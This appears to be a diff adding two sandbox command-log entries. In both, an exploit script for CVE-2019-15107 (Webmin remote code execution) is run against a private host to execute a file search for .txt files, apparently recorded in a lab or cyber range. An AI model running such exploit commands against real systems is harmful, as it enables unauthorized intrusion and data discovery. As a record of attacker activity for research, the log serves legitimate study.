@@ -1,0 +1,2 @@
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:30:20.331053+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / *.txt'"}
+{"sandbox_id": "85", "timestamp_str": "2020-07-15T10:30:42.171938+02:00", "cmd_type": "bash-command", "cmd": "python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / -name \"*.txt\"'"}
